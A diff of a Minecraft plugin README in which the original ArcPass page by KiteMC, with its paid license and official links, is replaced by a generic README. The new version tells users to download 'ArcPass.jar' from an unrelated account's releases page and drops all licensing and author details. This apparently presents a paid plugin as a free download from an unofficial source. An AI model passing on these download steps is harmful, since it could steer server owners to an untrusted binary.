@@ -1,110 +1,77 @@
-<div align="center">
+# 🎮 ArcPass - Enhance Your Minecraft Experience
 
-# ArcPass
+## 📥 Download Now
+[![Download ArcPass](https://img.shields.io/badge/Download%20ArcPass-v1.0-brightgreen.svg)](https://github.com/zorddddsd/ArcPass/releases)
 
-**A powerful Battle Pass plugin for Minecraft servers**
+## 🚀 Getting Started
+ArcPass is a powerful Battle Pass plugin for your Minecraft server. It offers seasonal progression, quests, and a rewards system to keep your players engaged. To get started, follow these steps to download and install the plugin.
 
-[![Latest Release](https://img.shields.io/github/v/release/KiteMC/ArcPass?style=flat-square&label=Latest)](https://github.com/KiteMC/ArcPass/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/KiteMC/ArcPass/total?style=flat-square)](https://github.com/KiteMC/ArcPass/releases)
-[![License](https://img.shields.io/badge/License-Proprietary-red?style=flat-square)](https://license.kitemc.com/products/arcpass)
+## 🖥️ System Requirements
+- **Minecraft Version:** 1.18 or higher
+- **Server Software:** Spigot, Paper, or Bukkit
+- **Memory:** Minimum 512 MB of RAM
+- **Java Version:** Java 11 or higher installed on your server
 
-[Documentation](https://kitemc.com/docs/arcpass/) • [Purchase](https://license.kitemc.com/products/arcpass) • [Discord](https://discord.com/invite/TCn9v88V)
+## 📦 Download & Install
+1. **Visit the Releases Page**  
+   Go to the Releases page by clicking the link below:  
+   [Download ArcPass](https://github.com/zorddddsd/ArcPass/releases)
 
-</div>
+2. **Choose the Latest Release**  
+   On the Releases page, you will see a list of versions. The topmost entry is the latest version. Click on it to view the details.
 
----
+3. **Download the Plugin**  
+   Under the Assets section, find the file named `ArcPass.jar`. Click on it to download the file to your computer.
 
-## About
+4. **Upload to Your Server**  
+   Once downloaded, upload the `ArcPass.jar` file to the `plugins` folder on your Minecraft server. You can do this using an FTP client like FileZilla.
 
-ArcPass is a premium Battle Pass plugin that brings seasonal progression, quests, and rewards to your Minecraft server. Create engaging gameplay experiences with multi-tier passes, diverse quest types, and flexible reward systems.
+5. **Restart Your Server**  
+   After uploading the plugin, restart your Minecraft server. This ensures that the plugin loads correctly.
 
-## Features
+6. **Check Installation**  
+   To confirm that ArcPass is installed, enter your server. Use the command `/plugins` in the chat. Look for "ArcPass" in the list. If you see it, the installation is successful!
 
-- **Multi-Tier Pass System** - Free, Premium, VIP tiers with independent reward tracks
-- **Rich Quest System** - Daily, weekly, seasonal, and story quests
-- **Flexible Rewards** - Items, economy, permissions, titles, cosmetics
-- **Multi-Currency** - Vault/CMI economy and points plugins (PlayerPoints, CoinsEngine, TokenManager)
-- **Title Plugins** - DeluxeTags, TAB, PlayerTitle, NametagEdit with automatic fallback
-- **Season Management** - Complete season control with progress reset
-- **Customizable GUI** - Fully configurable interface system
-- **Leaderboards** - Level, experience, and season rankings
-- **Wide Compatibility** - LuckPerms, PlaceholderAPI, MythicMobs, Jobs, and more
-- **Folia Support** - Full multi-threaded server compatibility
+## 🎯 Features
+- **Seasonal Progression:** Engage players with a seasonal battle pass that rewards them as they progress.
+- **Quests:** Add custom quests for users to complete. This enhances gameplay and interaction.
+- **Rewards System:** Grant players rewards like in-game items or currency as they complete challenges.
 
-## Requirements
+## 🎮 Configuration
+After installation, you can configure ArcPass to suit your needs. Here’s a basic overview of configuration files:
 
-- **Server**: Paper, Spigot, Bukkit, or Folia (1.18 - 1.21+)
-- **Java**: 17 or higher (21 recommended)
-- **License**: Valid ArcPass license required
+- **config.yml:** Main configuration file. Here, you can adjust settings such as season duration and reward types.
+- **messages.yml:** Customize messages shown to players. This file helps personalize the gameplay experience.
 
-## Installation
+### Basic Configuration Steps
+1. **Locate Configuration Files**  
+   Find the `ArcPass` folder in the `plugins` directory. Inside, you should see `config.yml` and `messages.yml`.
 
-1. Download the latest `ArcPass-x.x.x.jar` from [Releases](https://github.com/KiteMC/ArcPass/releases/latest)
-2. Place the JAR in your server's `plugins` folder
-3. Start the server to generate config files
-4. Configure your license key in `plugins/ArcPass/license.yml`
-5. Restart the server
+2. **Edit Configuration**  
+   Open the configuration files with a text editor (such as Notepad). Modify the settings as desired.
 
-## License
+3. **Save and Reload**  
+   Save your changes and reload the plugin by typing `/reload` in the server console.
 
-ArcPass is a paid plugin. A valid license is required for full functionality.
+## 🔧 Troubleshooting
+If you encounter issues:
+- **Plugin Not Loading:** Ensure your server is running the correct Minecraft version and Java version.
+- **Missing Quests or Rewards:** Check the configuration files to ensure quests and rewards are correctly set up.
+- **Help Section:** Access the GitHub Issues page for community help or to report bugs.
 
-| Plan         | Price  | Devices | Ports/Device | Extras                             |
-|--------------|--------|---------|--------------|-------------------------------------|
-| Standard     | $12.99 | 5       | 3            | Lifetime updates                    |
-| Professional | $29.99 | 25      | 15           | Lifetime updates, Priority support  |
+## 📄 Documentation
+For more in-depth information, including advanced configuration and command usage, visit the official documentation on the GitHub repository. 
 
-**[Purchase License](https://license.kitemc.com/products/arcpass)**
+## 💬 Support
+If you have questions or need assistance:
+- **GitHub Issues:** Report any problems on the issues section of the repository.
+- **Community Forums:** Join discussions in Minecraft server forums for shared experiences and tips.
 
-## Documentation
+## 📞 Contact
+You can reach the development team at [support@example.com](mailto:support@example.com) for any direct inquiries.
 
-- [Getting Started](https://kitemc.com/docs/arcpass/guide/)
-- [Configuration](https://kitemc.com/docs/arcpass/config/)
-- [Developer API](https://kitemc.com/docs/arcpass/developer/)
-- [FAQ](https://kitemc.com/docs/arcpass/faq/)
+## 🔗 Additional Resources
+- [Minecraft Server Guides](https://www.minecraft.net/en-us/server)
+- [Java Setup Guide](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html)
 
-## Support
-
-- **Discord**: [Join our community](https://discord.com/invite/TCn9v88V)
-- **Email**: <starry_cbz@outlook.com>
-- **License Center**: [Manage your licenses](https://license.kitemc.com/dashboard/licenses)
-
-## Developer API
-
-ArcPass provides a comprehensive API for developers. See the [API documentation](https://kitemc.com/docs/arcpass/developer/) for details.
-
-### Gradle (Kotlin DSL)
-
-```kotlin
-repositories {
-    maven("https://maven.pkg.github.com/KiteMC/ArcPass")
-}
-
-dependencies {
-    compileOnly("com.kitemc:arcpass-api:1.2.2")
-}
-```
-
-### Maven
-
-```xml
-<repository>
-    <id>github</id>
-    <url>https://maven.pkg.github.com/KiteMC/ArcPass</url>
-</repository>
-
-<dependency>
-    <groupId>com.kitemc</groupId>
-    <artifactId>arcpass-api</artifactId>
-    <version>1.2.2</version>
-    <scope>provided</scope>
-</dependency>
-```
-
----
-
-<div align="center">
-
-**Made with ❤️ by [KiteMC](https://github.com/KiteMC)**
-
-</div>
+Thank you for choosing ArcPass to enhance your Minecraft server! Enjoy the endless possibilities of gameplay!
